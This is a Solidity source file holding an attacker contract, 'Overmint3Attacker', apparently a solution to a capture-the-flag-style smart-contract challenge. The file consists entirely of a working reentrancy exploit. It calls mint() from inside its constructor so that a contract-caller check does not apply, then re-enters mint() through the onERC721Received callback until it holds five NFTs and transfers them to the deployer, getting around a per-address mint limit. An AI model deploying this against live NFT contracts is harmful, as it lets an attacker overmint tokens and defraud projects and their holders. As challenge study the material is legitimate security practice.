// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/utils/Address.sol";

import "hardhat/console.sol";

interface IOvermint3 {
    function mint() external;

    function totalSupply() external view returns (uint256);

    function amountMinted(address) external view returns (uint256);
}

contract Overmint3Attacker is IERC721Receiver {
    using Address for address;
    uint256[] private _tokenIds;
    address private victim;

    constructor(address _victim) {
        victim = _victim;
        IOvermint3(_victim).mint();

        for (uint256 i; i < _tokenIds.length; ) {
            IERC721(victim).safeTransferFrom(address(this), msg.sender, _tokenIds[i]);
            unchecked {
                ++i;
            }
        }
    }

    function onERC721Received(
        address /* operator */,
        address /* from */,
        uint256 tokenId,
        bytes calldata /* data */
    ) external override returns (bytes4) {
        console.log("onERC721Received");
        _tokenIds.push(tokenId);
        if (IERC721(victim).balanceOf(address(this)) < 5) IOvermint3(victim).mint();
        return IERC721Receiver.onERC721Received.selector;
    }
}
